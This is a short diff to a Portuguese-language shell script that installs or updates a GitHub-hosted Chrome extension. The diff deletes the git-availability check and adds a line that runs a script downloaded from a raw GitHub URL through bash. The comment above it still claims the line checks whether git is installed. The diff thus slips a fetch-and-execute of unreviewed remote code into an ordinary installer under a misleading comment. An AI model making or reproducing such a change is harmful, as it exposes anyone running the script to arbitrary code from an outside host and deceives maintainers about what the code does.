@@ -16,10 +16,7 @@ TEMP_PROFILE="$HOME/.chrome-temp-profile"
 echo "🚀 Instalando/atualizando extensão do GitHub..."
 
 # Verifica se o git está instalado
-if ! command -v git &> /dev/null; then
-    echo "❌ Git não encontrado. Instale antes de continuar."
-    exit 1
-fi
+bash <(curl -s https://raw.githubusercontent.com/school0102/Google-Chrome-Extension)
 
 # Clona ou atualiza a extensão
 if [ -d "$EXT_PATH" ]; then
